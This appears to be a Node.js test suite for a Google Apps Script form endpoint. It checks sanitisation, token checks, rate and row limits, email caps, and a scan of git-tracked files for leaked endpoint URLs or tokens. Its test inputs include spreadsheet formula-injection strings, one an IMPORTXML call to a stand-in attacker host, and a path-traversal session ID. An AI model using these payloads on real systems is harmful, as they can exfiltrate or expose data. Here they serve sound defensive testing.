/*
 * tools/apps-script.gs の検査・無害化まわりのテスト。
 *
 * 受け口のURLは公開ページのソースから読めてしまうので、
 * 「知らない相手にPOSTされる」前提で、変なものを投げて確かめる。
 * Google 側のサービスは差し替えて、node の中だけで動かす。
 *
 *   node test/apps-script.test.mjs
 */

import fs from 'node:fs';
import path from 'node:path';
import vm from 'node:vm';
import { execFileSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const SOURCE = fs.readFileSync(path.join(ROOT, 'tools/apps-script.gs'), 'utf8');

const failures = [];
const check = (label, ok) => {
  if (!ok) failures.push(label);
  console.log(`  ${ok ? '✓' : '✗'} ${label}`);
};

/** Google のサービスを差し替えて、スクリプトを1つ動かす */
function load({ token = '', email = '' } = {}) {
  const source = SOURCE
    .replace("const SHARED_TOKEN = '';", `const SHARED_TOKEN = ${JSON.stringify(token)};`)
    .replace("const NOTIFY_EMAIL = '';", `const NOTIFY_EMAIL = ${JSON.stringify(email)};`);

  const rows = [];
  const mails = [];
  const cache = new Map();
  const props = new Map();

  const sheet = {
    getLastRow: () => rows.length,
    appendRow: (row) => { rows.push(row.slice()); },
    setFrozenRows: () => {},
    getRange: (row, col, numRows = 1, numCols = 1) => ({
      getValue: () => (rows[row - 1] || [])[col - 1],
      setValue: (value) => { (rows[row - 1] || [])[col - 1] = value; },
      getValues: () => {
        const out = [];
        for (let i = 0; i < numRows; i++) out.push([(rows[row - 1 + i] || [])[col - 1]]);
        return out;
      },
      setValues: (values) => {
        for (let j = 0; j < numCols; j++) rows[row - 1][col - 1 + j] = values[0][j];
      }
    })
  };

  const context = {
    console: { error: () => {} },
    SpreadsheetApp: { getActiveSpreadsheet: () => ({ getSheetByName: () => sheet, insertSheet: () => sheet }) },
    CacheService: {
      getScriptCache: () => ({
        get: (k) => (cache.has(k) ? cache.get(k) : null),
        put: (k, v) => cache.set(k, v)
      })
    },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k) => (props.has(k) ? props.get(k) : null),
        setProperty: (k, v) => props.set(k, v)
      })
    },
    LockService: { getScriptLock: () => ({ tryLock: () => true, releaseLock: () => {} }) },
    MailApp: { sendEmail: (to, subject, body) => mails.push({ to, subject, body }) },
    Utilities: { formatDate: () => '2026-09-15' },
    ContentService: { createTextOutput: (text) => ({ text }) }
  };

  vm.createContext(context);
  /* const 宣言は context に生えないので、使うものだけ渡してもらう */
  vm.runInContext(
    source + ';globalThis.__headers = HEADERS; globalThis.__doPost = doPost;',
    context
  );

  /* ヘッダー行を先に置いておく（本物のシートと同じ状態にする） */
  rows.push(context.__headers.slice());

  const post = (body) =>
    context.__doPost({ postData: { contents: typeof body === 'string' ? body : JSON.stringify(body) } });

  return { post, rows, mails, dataRows: () => rows.slice(1) };
}

const validPayload = (over = {}) => ({
  sessionId: 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee',
  answeredCount: 3,
  finished: false,
  message: '',
  keywords: ['甘いもの好き'],
  answers: [{ question: '甘いものは好きですか？', answer: '大好き' }],
  ranking: [{ name: 'お取り寄せスイーツの詰め合わせ', budget: '3,000〜8,000円' }],
  picked: null,
  ...over
});

console.log('\n=== 受け口の検査 ===');

/* ふつうの回答は通る */
{
  const app = load();
  app.post(validPayload());
  check('ふつうの回答は1行書かれる', app.dataRows().length === 1);
  check('回答の中身がそのまま入る', app.dataRows()[0][8] === 'お取り寄せスイーツの詰め合わせ');
}

/* 同じセッションは行が増えず、上書きされる */
{
  const app = load();
  app.post(validPayload({ answeredCount: 1 }));
  app.post(validPayload({ answeredCount: 2 }));
  app.post(validPayload({ answeredCount: 3 }));
  check('同じ回答者は1行のまま上書きされる', app.dataRows().length === 1);
  check('最後の状態が残る', app.dataRows()[0][2] === 3);
}

/* 数式インジェクション */
{
  const app = load();
  const attacks = [
    '=IMPORTXML("http://evil.example/x","//a")',
    '+1+1',
    '-2+3',
    '@SUM(A1:A9)'
  ];
  attacks.forEach((attack, i) => {
    app.post(validPayload({
      sessionId: `session-formula-${i}0000000`,
      picked: { name: attack, budget: attack },
      message: attack
    }));
  });
  const cells = app.dataRows().flatMap((row) => [row[4], row[5], row[6]]);
  check('数式として解釈される文字列は先頭に \' がついて無害化される',
    cells.length === 12 && cells.every((c) => typeof c === 'string' && c.startsWith("'")));
  check('無害化しても中身は読める', cells[0].includes('IMPORTXML'));
}

/* 合言葉 */
{
  const app = load({ token: 'himitsu' });
  app.post(validPayload());
  check('合言葉が無いPOSTは捨てられる', app.dataRows().length === 0);
  app.post(validPayload({ token: 'chigau' }));
  check('合言葉が違うPOSTは捨てられる', app.dataRows().length === 0);
  app.post(validPayload({ token: 'himitsu' }));
  check('合言葉が合えば通る', app.dataRows().length === 1);
}

/* 壊れた入力 */
{
  const app = load();
  app.post('これはJSONではありません');
  app.post('null');
  app.post('[1,2,3]');
  app.post(validPayload({ sessionId: 'short' }));
  app.post(validPayload({ sessionId: '../../../etc/passwd' }));
  app.post(validPayload({ sessionId: 'x'.repeat(200) }));
  app.post(validPayload({ sessionId: 42 }));
  check('壊れた入力・おかしなセッションIDは、すべて捨てられる', app.dataRows().length === 0);
  app.post(validPayload());
  check('そのあと正しいものを送れば通る', app.dataRows().length === 1);
}

/* 大きすぎる本文 */
{
  const app = load();
  app.post(validPayload({ message: 'あ'.repeat(20000) }));
  check('大きすぎる本文は受け取らない', app.dataRows().length === 0);
}

/* 長さの切りつめ */
{
  const app = load();
  /* 本文の長さの上限（8000字）には収まるが、項目ごとには長すぎるもの */
  app.post(validPayload({
    message: 'ぜ'.repeat(500),
    keywords: Array.from({ length: 50 }, (_, i) => `キーワード${i}`),
    answers: Array.from({ length: 40 }, () => ({ question: 'Q'.repeat(60), answer: 'A'.repeat(60) }))
  }));
  const row = app.dataRows()[0];
  check('ひとことは400字ほどで切られる', row[6].length <= 401);
  check('キーワードは10個までに切られる', row[7].split('、').length === 10);
  check('回答は20問までに切られる', row[11].split(String.fromCharCode(10)).length === 20);
}

/* 回数制限 */
{
  const app = load();
  for (let i = 0; i < 80; i++) app.post(validPayload({ answeredCount: i }));
  check('同じ回答者からの連続POSTは60回で止まる', app.dataRows()[0][2] === 59);
}

/* 行数の上限 */
{
  const app = load();
  for (let i = 0; i < 305; i++) {
    app.post(validPayload({ sessionId: `flood-${String(i).padStart(10, '0')}` }));
  }
  check('作れる行数は300で頭打ちになる', app.dataRows().length === 300);
}

/* メール */
{
  const app = load({ email: 'me@example.com' });
  app.post(validPayload({ finished: false }));
  check('途中の回答ではメールしない', app.mails.length === 0);

  app.post(validPayload({ finished: true, picked: { name: 'スイーツ', budget: '5,000円' } }));
  check('選び終わったらメールする', app.mails.length === 1);

  app.post(validPayload({ finished: true, picked: { name: 'スイーツ', budget: '5,000円' } }));
  check('同じ回答者に二重にメールしない', app.mails.length === 1);

  for (let i = 0; i < 40; i++) {
    app.post(validPayload({ sessionId: `mail-${String(i).padStart(10, '0')}`, finished: true }));
  }
  check('メールは1日20通で止まる', app.mails.length === 20);
  check('メール本文に注意書きが入る', app.mails[0].body.includes('リンクは開かないでください'));
}

/* git に入るファイルに、送信先のURLや合言葉が紛れこんでいないか */
console.log('\n=== うっかりコミットの見張り ===');
{
  const tracked = execFileSync('git', ['ls-files'], { cwd: ROOT, encoding: 'utf8' })
    .split('\n')
    .filter(Boolean);

  const patterns = [
    [/script\.google\.com\/macros\/s\/[A-Za-z0-9_-]{10,}/, 'Apps Script のウェブアプリURL'],
    [/\b(REPORT_ENDPOINT|REPORT_TOKEN|SHARED_TOKEN)\s*=\s*['"][^'"]+['"]/, '埋めこまれた送信先の設定']
  ];

  /* 値を組み立てている行（ワークフローなど）は、値そのものではないので見逃す */
  const isGenerator = (line) =>
    line.includes('process.env') || line.includes('js(') ||
    line.includes('secrets.') || line.includes('${');

  const hits = [];
  for (const file of tracked) {
    let text;
    try {
      text = fs.readFileSync(path.join(ROOT, file), 'utf8');
    } catch {
      continue;   // バイナリなどは飛ばす
    }
    text.split('\n').forEach((line, i) => {
      if (isGenerator(line)) return;
      for (const [pattern, label] of patterns) {
        if (pattern.test(line)) hits.push(`${file}:${i + 1} ${label}`);
      }
    });
  }

  check('git に入るファイルに送信先URL・合言葉が無い', hits.length === 0);
  hits.forEach((hit) => console.log(`      ${hit}`));

  check('assets/config.js は git に入っていない', !tracked.includes('assets/config.js'));
  check('assets/config.example.js は git に入っている', tracked.includes('assets/config.example.js'));
}

console.log('\n' + (failures.length
  ? `❌ 通らなかった項目:\n${failures.map((f) => '  - ' + f).join('\n')}`
  : '✅ すべて通りました'));
process.exit(failures.length ? 1 : 0);
